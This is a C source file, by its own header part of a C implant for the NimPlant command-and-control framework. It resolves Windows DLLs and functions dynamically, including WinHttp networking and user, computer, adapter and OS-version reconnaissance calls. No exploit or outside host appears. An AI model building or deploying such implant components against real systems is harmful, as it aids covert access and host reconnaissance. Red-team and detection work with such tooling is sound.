/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Populate the context tables with modules & functions you would like to use.
 * 
 * @param struct Relocatable* context A 'global' variable capturing Relocatable's entire context (loaded modules & functions)
 */
void PopulateModuleAndFunctionTables(struct Relocatable* context) {
    // Define modules
    DEFINE_STRING(Kernel32ModuleName, "KERNEL32.dll");
    DEFINE_STRING(MsvcrtName, "Msvcrt.dll");
    DEFINE_STRING(UcrtBaseName, "UcrtBase.dll");
    DEFINE_STRING(WinHttpName, "WinHttp.dll");
    DEFINE_STRING(IpHlpApiName, "Iphlpapi.dll");
    DEFINE_STRING(Ws2_32Name, "Ws2_32.dll");
    DEFINE_STRING(Advapi32Name, "Advapi32.dll");
    DEFINE_STRING(NtdllName, "Ntdll.dll");

    // Load modules
    context->modules.hKernel32 = context->functions.LoadLibraryA(Kernel32ModuleName);
    context->modules.hMsvcrt = context->functions.LoadLibraryA(MsvcrtName);
    context->modules.hUcrtBase = context->functions.LoadLibraryA(UcrtBaseName);
    context->modules.hWinHttp = context->functions.LoadLibraryA(WinHttpName);
    context->modules.hIpHlpApi = context->functions.LoadLibraryA(IpHlpApiName);
    context->modules.hWs2_32 = context->functions.LoadLibraryA(Ws2_32Name);
    context->modules.hAdvapi32 = context->functions.LoadLibraryA(Advapi32Name);
    context->modules.hNtdll = context->functions.LoadLibraryA(NtdllName);

    // Define functions
    DEFINE_STRING(RandName, "rand");
    DEFINE_STRING(SrandName, "srand");
    DEFINE_STRING(TimeName, "time");
    DEFINE_STRING(WcsLenName, "wcslen");
    DEFINE_STRING(WcsCatSName, "wcscat_s");
    DEFINE_STRING(WcsCpyName, "wcscpy");
    DEFINE_STRING(StrLenName, "strlen");
    DEFINE_STRING(StrCpyName, "strcpy");
    DEFINE_STRING(StrCatName, "strcat");
    DEFINE_STRING(StrCmpName, "strcmp");
    DEFINE_STRING(StrChrName, "strchr");
    DEFINE_STRING(StrRchrName, "strrchr");
    DEFINE_STRING(MallocName, "malloc");
    DEFINE_STRING(CallocName, "calloc");
    DEFINE_STRING(ReAllocName, "realloc");
    DEFINE_STRING(MemCpyName, "memcpy");
    DEFINE_STRING(MemSetName, "memset");
    DEFINE_STRING(FreeName, "free");
    DEFINE_STRING(MultiByteToWideCharName, "MultiByteToWideChar");
    DEFINE_STRING(SnprintfName, "_snprintf");
    DEFINE_STRING(SprintfName, "sprintf");
    DEFINE_STRING(WinHttpOpenName, "WinHttpOpen");
    DEFINE_STRING(WinHttpConnectName, "WinHttpConnect");
    DEFINE_STRING(WinHttpOpenRequestName, "WinHttpOpenRequest");
    DEFINE_STRING(WinHttpSendRequestName, "WinHttpSendRequest");
    DEFINE_STRING(WinHttpReceiveResponseName, "WinHttpReceiveResponse");
    DEFINE_STRING(WinHttpCloseHandleName, "WinHttpCloseHandle");
    DEFINE_STRING(WinHttpQueryHeadersName, "WinHttpQueryHeaders");
    DEFINE_STRING(WinHttpQueryDataAvailableName, "WinHttpQueryDataAvailable");
    DEFINE_STRING(WinHttpReadDataName, "WinHttpReadData");
    DEFINE_STRING(GetAdaptersAddressesName, "GetAdaptersAddresses");
    DEFINE_STRING(InetNtopName, "inet_ntop");
    DEFINE_STRING(GetUserNameAName, "GetUserNameA");
    DEFINE_STRING(GetComputerNameAName, "GetComputerNameA");
    DEFINE_STRING(GetCurrentProcessIdName, "GetCurrentProcessId");
    DEFINE_STRING(GetModuleFileNameAName, "GetModuleFileNameA");
    DEFINE_STRING(SleepName, "Sleep");
    DEFINE_STRING(RtlGetVersionName, "RtlGetVersion");
    DEFINE_STRING(FopenName, "fopen");
    DEFINE_STRING(FseekName, "fseek");
    DEFINE_STRING(FtellName, "ftell");
    DEFINE_STRING(FcloseName, "fclose");
    DEFINE_STRING(FreadName, "fread");
    DEFINE_STRING(ChdirName, "_chdir");
    DEFINE_STRING(CreateFileAName, "CreateFileA");
    DEFINE_STRING(CloseHandleName, "CloseHandle");
    DEFINE_STRING(ReadFileName, "ReadFile");
    DEFINE_STRING(GetFileSizeName, "GetFileSize");

    // Load functions
    context->functions.rand = (int (*)(void)) context->functions.GetProcAddress(context->modules.hUcrtBase, RandName);
    context->functions.srand = (void (*)(unsigned int)) context->functions.GetProcAddress(context->modules.hUcrtBase, SrandName);
    context->functions.time = (time_t (*)(time_t*)) context->functions.GetProcAddress(context->modules.hMsvcrt, TimeName);
    context->functions.wcslen = (size_t (*)(const wchar_t*)) context->functions.GetProcAddress(context->modules.hUcrtBase, WcsLenName);
    context->functions.wcscat_s = (wchar_t* (*)(wchar_t*, size_t, const wchar_t*)) context->functions.GetProcAddress(context->modules.hUcrtBase, WcsCatSName);
    context->functions.wcscpy = (wchar_t* (*)(wchar_t*, const wchar_t*)) context->functions.GetProcAddress(context->modules.hUcrtBase, WcsCpyName);
    context->functions.strlen = (size_t (*)(const char*)) context->functions.GetProcAddress(context->modules.hUcrtBase, StrLenName);
    context->functions.strcpy = (char* (*)(char*, const char*)) context->functions.GetProcAddress(context->modules.hUcrtBase, StrCpyName);
    context->functions.strcat = (char* (*)(char*, const char*)) context->functions.GetProcAddress(context->modules.hUcrtBase, StrCatName);
    context->functions.strcmp = (int (*)(const char* str1, const char* str2)) context->functions.GetProcAddress(context->modules.hUcrtBase, StrCmpName);
    context->functions.strchr = (char* (*)(const char*, int)) context->functions.GetProcAddress(context->modules.hUcrtBase, StrChrName);
    context->functions.strrchr = (char* (*)(const char*, int)) context->functions.GetProcAddress(context->modules.hUcrtBase, StrRchrName);
    context->functions.malloc = (void* (*)(size_t)) context->functions.GetProcAddress(context->modules.hUcrtBase, MallocName);
    context->functions.calloc = (void* (*)(size_t, size_t)) context->functions.GetProcAddress(context->modules.hUcrtBase, CallocName);
    context->functions.realloc = (void* (*)(void*, size_t)) context->functions.GetProcAddress(context->modules.hUcrtBase, ReAllocName);
    context->functions.memcpy = (void* (*)(void*, void*, size_t)) context->functions.GetProcAddress(context->modules.hUcrtBase, MemCpyName);
    context->functions.memset = (void (*)(void*, int, size_t)) context->functions.GetProcAddress(context->modules.hUcrtBase, MemSetName);
    context->functions.free = (void (*)(void*)) context->functions.GetProcAddress(context->modules.hUcrtBase, FreeName);
    context->functions.MultiByteToWideChar = (int (*)(UINT, DWORD, LPCCH, int, LPWSTR, int)) context->functions.GetProcAddress(context->modules.hKernel32, MultiByteToWideCharName);
    context->functions.snprintf = (int (*)(char*, size_t, const char*, ...)) context->functions.GetProcAddress(context->modules.hMsvcrt, SnprintfName);
    context->functions.sprintf = (int (*)(char*, const char*, ...)) context->functions.GetProcAddress(context->modules.hMsvcrt, SprintfName);
    context->functions.WinHttpOpen = (HINTERNET (*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD)) context->functions.GetProcAddress(context->modules.hWinHttp, WinHttpOpenName);
    context->functions.WinHttpConnect = (HINTERNET (*)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD)) context->functions.GetProcAddress(context->modules.hWinHttp, WinHttpConnectName);
    context->functions.WinHttpOpenRequest = (HINTERNET (*)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD)) context->functions.GetProcAddress(context->modules.hWinHttp, WinHttpOpenRequestName);
    context->functions.WinHttpSendRequest = (HINTERNET (*)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR)) context->functions.GetProcAddress(context->modules.hWinHttp, WinHttpSendRequestName);
    context->functions.WinHttpReceiveResponse = (HINTERNET (*)(HINTERNET, LPVOID)) context->functions.GetProcAddress(context->modules.hWinHttp, WinHttpReceiveResponseName);
    context->functions.WinHttpCloseHandle = (HINTERNET (*)()) context->functions.GetProcAddress(context->modules.hWinHttp, WinHttpCloseHandleName);
    context->functions.WinHttpQueryHeaders = (BOOL (*)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD)) context->functions.GetProcAddress(context->modules.hWinHttp, WinHttpQueryHeadersName);
    context->functions.WinHttpQueryDataAvailable = (BOOL (*)(HINTERNET, LPDWORD)) context->functions.GetProcAddress(context->modules.hWinHttp, WinHttpQueryDataAvailableName);
    context->functions.WinHttpReadData = (BOOL (*)(HINTERNET, LPVOID, DWORD, LPDWORD)) context->functions.GetProcAddress(context->modules.hWinHttp, WinHttpReadDataName);
    context->functions.GetAdaptersAddresses = (ULONG (*)(ULONG, ULONG, PVOID, PIP_ADAPTER_ADDRESSES, PULONG)) context->functions.GetProcAddress(context->modules.hIpHlpApi, GetAdaptersAddressesName);
    context->functions.inet_ntop = (PCSTR (*)(INT, const VOID*, PSTR, size_t)) context->functions.GetProcAddress(context->modules.hWs2_32, InetNtopName);
    context->functions.GetUserNameA = (BOOL (*)(LPSTR, LPDWORD)) context->functions.GetProcAddress(context->modules.hAdvapi32, GetUserNameAName);
    context->functions.GetComputerNameA = (BOOL (*)(LPSTR, LPDWORD)) context->functions.GetProcAddress(context->modules.hKernel32, GetComputerNameAName);
    context->functions.GetCurrentProcessId = (DWORD (*)(void)) context->functions.GetProcAddress(context->modules.hKernel32, GetCurrentProcessIdName);
    context->functions.GetModuleFileNameA = (DWORD (*)(HMODULE, LPSTR, DWORD)) context->functions.GetProcAddress(context->modules.hKernel32, GetModuleFileNameAName);
    context->functions.Sleep = (void (*)(DWORD)) context->functions.GetProcAddress(context->modules.hKernel32, SleepName);
    context->functions.RtlGetVersion = (NTSTATUS (*)(PRTL_OSVERSIONINFOW)) context->functions.GetProcAddress(context->modules.hNtdll, RtlGetVersionName);
    context->functions.fopen = (FILE* (*)(const char*, const char*)) context->functions.GetProcAddress(context->modules.hUcrtBase, FopenName);
    context->functions.fseek = (int (*)(FILE*, long, int)) context->functions.GetProcAddress(context->modules.hUcrtBase, FseekName);
    context->functions.ftell = (long (*)(FILE*)) context->functions.GetProcAddress(context->modules.hUcrtBase, FtellName);
    context->functions.fclose = (int (*)(FILE*)) context->functions.GetProcAddress(context->modules.hUcrtBase, FcloseName);
    context->functions.fread = (size_t (*)(void*, size_t, size_t, FILE*)) context->functions.GetProcAddress(context->modules.hUcrtBase, FreadName);
    context->functions.chdir = (int (*)(const char *)) context->functions.GetProcAddress(context->modules.hUcrtBase, ChdirName);
    context->functions.CreateFileA = (HANDLE (*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)) 
        context->functions.GetProcAddress(context->modules.hKernel32, CreateFileAName);

    context->functions.CloseHandle = (BOOL (*)(HANDLE)) 
        context->functions.GetProcAddress(context->modules.hKernel32, CloseHandleName);

    context->functions.ReadFile = (BOOL (*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) 
        context->functions.GetProcAddress(context->modules.hKernel32, ReadFileName);

    context->functions.GetFileSize = (DWORD (*)(HANDLE, LPDWORD)) 
        context->functions.GetProcAddress(context->modules.hKernel32, GetFileSizeName);

}